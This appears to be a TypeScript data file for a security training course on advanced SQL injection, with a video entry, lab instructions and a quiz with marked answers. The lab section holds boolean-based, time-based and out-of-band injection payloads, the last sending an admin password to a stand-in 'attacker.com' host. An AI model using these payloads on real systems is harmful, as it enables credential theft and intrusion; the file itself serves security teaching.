import { CourseModule } from '../../types/course';

export const sqlInjectionLevel2Modules: CourseModule[] = [
  {
    id: 'sql-level2-intro',
    title: 'Level 2: Advanced SQL Injection Techniques',
    duration: '2h',
    type: 'video',
    status: 'available',
    description: 'Master advanced SQL injection techniques including blind SQL injection and automated exploitation.',
    videoUrl: 'https://example.com/videos/advanced-sql-injection',
  },
  {
    id: 'sql-level2-lab',
    title: 'Advanced SQL Injection Lab',
    duration: '3h',
    type: 'lab',
    status: 'available',
    description: 'Practice advanced SQL injection techniques in real-world scenarios.',
    labInstructions: `
Advanced SQL Injection Laboratory

1. Environment Setup:
   - Access the vulnerable web application
   - Configure your proxy tools
   - Set up automated testing frameworks

2. Advanced Techniques:
   - Boolean-based blind injection
   - Time-based blind injection
   - Out-of-band SQL injection
   - Second-order SQL injection

3. Automation Practice:
   - Using SQLMap effectively
   - Custom Python exploitation scripts
   - Handling WAF bypass scenarios

4. Advanced Exploitation:
   \`\`\`sql
   -- Boolean-based data extraction
   ' AND (SELECT CASE WHEN (username='admin') THEN 1 ELSE 0 END FROM users)=1--
   
   -- Time-based data extraction
   ' AND (SELECT CASE WHEN (substring(password,1,1)='a') THEN sleep(5) ELSE 0 END FROM users)--
   
   -- Out-of-band techniques
   ' UNION ALL SELECT NULL,NULL,LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users WHERE username='admin'),'.attacker.com\\\\abc'))--
   \`\`\`

5. Defense Analysis:
   - Understanding WAF detection
   - Implementing proper input validation
   - Using prepared statements
   - Real-time attack monitoring
    `,
  },
  {
    id: 'sql-level2-quiz',
    title: 'Advanced SQL Injection Assessment',
    duration: '1h',
    type: 'quiz',
    status: 'available',
    description: 'Test your knowledge of advanced SQL injection techniques.',
    questions: [
      {
        question: 'Which technique is most effective for extracting data when no output is visible?',
        options: [
          'Boolean-based blind SQL injection',
          'UNION-based SQL injection',
          'Error-based SQL injection',
          'Stacked queries',
        ],
        correctAnswer: 0,
      },
      {
        question: 'What is the primary purpose of time-based SQL injection?',
        options: [
          'To extract data when no other feedback is available',
          'To speed up the attack',
          'To bypass authentication',
          'To corrupt the database',
        ],
        correctAnswer: 0,
      },
      {
        question: 'Which tool is commonly used for automated SQL injection testing?',
        options: [
          'SQLMap',
          'Wireshark',
          'Tcpdump',
          'Netcat',
        ],
        correctAnswer: 0,
      },
      {
        question: 'What is a second-order SQL injection?',
        options: [
          'An attack that occurs when stored user input is used in SQL queries later',
          'Using two SQL queries at once',
          'Injecting into two different parameters',
          'Using both AND and OR operators',
        ],
        correctAnswer: 0,
      },
    ],
  },
];